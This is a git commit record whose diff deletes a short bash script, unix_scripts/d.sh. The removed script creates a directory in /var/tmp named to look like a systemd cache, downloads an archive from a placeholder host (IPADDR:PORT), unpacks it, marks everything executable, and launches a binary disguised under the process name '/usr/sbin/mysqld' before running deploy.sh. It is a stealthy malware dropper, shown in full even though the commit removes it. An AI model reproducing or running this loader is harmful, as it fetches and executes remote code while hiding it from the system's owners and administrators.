4ad0e9e5efad69d1d38c8d2f8a8f143b0def6446
Tony West <47873286+Un4gi@users.noreply.github.com>
2020-04-23 19:12:09 -0700

    Delete d.sh

--- unix_scripts/d.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-cd /var/tmp; mkdir systemd-cache; cd systemd-cache
-wget http://IPADDR:PORT/r.tgz
-tar xzvf r.tgz
-chmod 755 ./*
-/bin/bash -c "exec -a '/usr/sbin/mysqld' ./i" &
-./deploy.sh
-exit
